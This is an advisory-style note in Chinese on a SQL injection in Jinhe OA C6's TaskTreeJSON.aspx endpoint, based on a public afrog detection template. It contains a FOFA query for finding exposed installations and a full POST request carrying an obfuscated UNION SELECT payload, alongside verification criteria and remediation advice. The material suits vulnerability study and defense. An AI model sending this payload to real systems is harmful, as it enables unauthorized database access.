---
source: "https://github.com/zan8in/afrog/blob/93e56607188ccfa4b26bc529c7fa10c92696fdc1/pocs/afrog-pocs/vulnerability/jinhe-oa-tasktreejson-sqli.yaml"
fofa: "app=\"金和网络-金和OA\""
version: "未知"
---

# 金和OA TaskTreeJSON.aspx SQL注入漏洞

## 漏洞描述

afrog 公开模板记录金和 OA C6 的 `TaskTreeJSON.aspx` SQL 注入检测，参数为 POST 表单中的 `id`，使用联合查询返回 SQL Server 版本。

## 影响版本与前提

金和 OA C6；确切受影响版本、修复版本及不同部署的鉴权条件未知。来源模板的请求未提供业务登录凭据；这不等于所有部署均可未授权利用。

## 网络测绘

```text
app="金和网络-金和OA"
```

## 公开验证资料

以下请求摘自公开来源，主机名如有展示统一为 `example.invalid`；仅作为授权环境中的资料参考。

```http
POST /c6/Jhsoft.Web.dailytaskmanage/TaskTreeJSON.aspx/ HTTP/1.1
Host: example.invalid
Content-Type: application/x-www-form-urlencoded

id='/**/UniOn/**/all/**/SelECt/**/NULL,@@verSion,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
```

## 判定与证据边界

上游要求 HTTP 200 且正文包含 `Microsoft SQL Server`。核对该版本文本是否来自本次查询，并与正常请求比较，避免把静态页面文字或数据库错误页误认为注入成功。

本篇仅静态核对公开资料，未对目标发包，未运行利用工具，也未完成本地复现。

## 修复建议

向厂商核对当前安装版本与可用补丁，在完成修复前限制相关接口的访问。修复对应查询的输入拼接，使用参数化查询，并限制数据库账户权限。

## 参考来源

- [公开检测模板](https://github.com/zan8in/afrog/blob/93e56607188ccfa4b26bc529c7fa10c92696fdc1/pocs/afrog-pocs/vulnerability/jinhe-oa-tasktreejson-sqli.yaml)
